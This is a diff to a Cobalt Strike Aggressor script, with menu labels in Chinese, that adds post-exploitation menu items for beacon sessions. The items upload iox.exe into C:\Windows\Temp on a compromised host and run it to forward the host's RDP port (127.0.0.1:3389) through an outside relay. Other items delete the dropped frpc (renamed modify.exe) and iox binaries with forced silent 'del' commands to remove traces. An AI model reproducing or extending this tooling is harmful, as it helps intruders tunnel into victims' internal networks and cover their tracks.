@@ -55,8 +55,53 @@ sub frpc_run{
     $port = replace($3['port'], "\"", "");
 	bshell($bid, "modify.exe -t  $+ $Name -p  $+ $port");
 }
-    }
 
+        	item "删除frpc"{
+        	local('$bid');
+        	foreach $bid ($1){
+            	bshell($1, "del /f /s /q modify.exe");
+        	}
+		}
+    }
+	    menu "iox端口转发" {
+			item "上传iox" {
+				$bid = $1;
+				$dialog = dialog("上传iox", %(UploadPath => "C:\\Windows\\Temp\\", bid => $bid), &iox);
+				drow_text($dialog, "UploadPath",  "上传路径: "); 	
+				dbutton_action($dialog, "上传");
+				dialog_show($dialog);
+        }
+sub iox {
+
+    bcd($bid, $3['UploadPath']);
+
+        bupload($bid, script_resource("/script/iox.exe"));
+    }
+                item "运行iox"{
+                    $bid = $1['@'];
+                    $Dialog = dialog("运行iox",%(lhost => "127.0.0.1:3389", rhost => "*8.8.8.8:3389", hex => "65535",bid => $bid),&iox_run);
+                    dialog_description($Dialog, "lhost:./iox fwd -r 192.168.0.100:3389 -r *1.1.1.1:8888 -k 656565 rhost:./iox fwd -l *8888 -l 33890 -k 656565");
+                    drow_text($Dialog, "lhost", "lhost: ");
+                    drow_text($Dialog, "rhost", "rhost: ");
+					drow_text($Dialog, "hex", "hex: ");
+                    dbutton_action($Dialog, "运行");
+                    dialog_show($Dialog);
+                }
+
+sub iox_run{
+    local('$lhost $rhost $hex');
+    $lhost = $3['lhost'];
+    $rhost = replace($3['rhost'], "\"", "");
+	$hex = $3['hex'];
+	bshell($bid, "iox.exe fwd -r  $+ $lhost -r  $+ $rhost -k  $+ $hex");
+}  
+        	item "删除iox"{
+        	local('$bid');
+        	foreach $bid ($1){
+            	bshell($1, "del /f /s /q iox.exe");
+        	}
+		}
+}
 
 
 }
